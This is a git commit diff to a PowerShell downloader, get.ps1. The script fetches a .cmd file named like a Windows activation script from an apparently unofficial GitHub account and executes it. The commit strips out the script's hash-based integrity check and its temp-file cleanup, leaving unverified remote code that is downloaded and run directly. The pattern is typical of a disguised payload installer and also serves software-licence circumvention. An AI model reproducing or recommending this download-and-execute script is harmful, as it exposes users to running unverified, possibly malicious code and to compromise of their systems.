3f70edc33d24f021d2cb880469460e904c61f27b
HideoutWin <hls777us@proton.me>
2024-08-16 12:33:41 -0300

    Update get.ps1

--- get.ps1
+++ get.ps1
@@ -3,13 +3,10 @@ $ErrorActionPreference = "Stop"
 # Enable TLSv1.2 for compatibility with older clients for current session
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-$FilePath6 = if ($isAdmin) { "$env:SystemRoot\Temp\MAS_AIO-CRC32_8C3AA7E0.cmd" } else { "$env:TEMP\MAS_AIO-CRC32_8C3AA7E0.cmd" }
-powershell -ExecutionPolicy Bypass -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/HideoutWin/windows/main/MAS_AIO-CRC32_8C3AA7E0.cmd' -OutFile '$FilePath6'"
 
 $DownloadURL1 = 'https://raw.githubusercontent.com/HideoutWin/windows/main/MAS_AIO-CRC32_8C3AA7E0.cmd'
-$DownloadURL2 = 'https://raw.githubusercontent.com/HideoutWin/windows/main/MAS_AIO-CRC32_8C3AA7E0.cmd'
 
-$URLs = @($DownloadURL1, $DownloadURL2)
+$URLs = @($DownloadURL1)
 $RandomURL1 = Get-Random -InputObject $URLs
 $RandomURL2 = ($URLs -ne $RandomURL1)[0]
 
@@ -19,15 +16,6 @@ try {
 catch {
     $response = Invoke-WebRequest -Uri $RandomURL2 -UseBasicParsing
 }
-
-# Verify script integrity
-$releaseHash = 'D666A4C7810B9D3FE9749F2D4E15C5A65D4AC0D7F0B14A144D6631CE61CC5DF3'
-$stream = New-Object IO.MemoryStream
-$writer = New-Object IO.StreamWriter $stream
-$writer.Write($response)
-$writer.Flush()
-$stream.Position = 0
-
 
 $rand = [Guid]::NewGuid().Guid
 $isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
@@ -49,7 +37,4 @@ Set-Content -Path $FilePath -Value $content
 
 # Set ComSpec variable for current session in case its corrupt in the system
 $env:ComSpec = "$env:SystemRoot\system32\cmd.exe"
-Start-Process cmd.exe "/c """"$FilePath6"" $ScriptArgs""" -Wait
-
-$FilePaths = @("$env:TEMP\MAS*.cmd", "$env:SystemRoot\Temp\MAS*.cmd")
-foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
+Start-Process cmd.exe "/c """"$FilePath"" $ScriptArgs""" -Wait
